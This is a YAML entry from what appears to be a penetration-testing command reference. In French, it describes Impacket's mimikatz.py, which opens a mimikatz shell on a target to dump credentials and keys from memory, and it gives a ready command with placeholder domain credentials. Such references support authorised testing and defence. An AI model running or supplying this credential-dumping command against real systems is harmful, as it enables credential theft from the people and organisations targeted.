---
description: |
  Le fichier mimikatz.py d'Impacket vous fera entrer dans un shell mimikatz sur la machine cible, ce qui vous permettra d'effectuer toutes les actions liées à mimikatz, telles que l'extraction des informations d'identification de la mémoire, l'extraction des clés, etc.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username: john

  	Password: password123

command: |
  python3 mimikatz.py test.local/john:password123@10.10.10.1
items:
  - Password
  - Username
services:
  - Kerberos
OS:
  - Linux
  - Windows
  - Approved-tool
attack_types:
  - Exploitation
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/mimikatz.py
  - https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
---
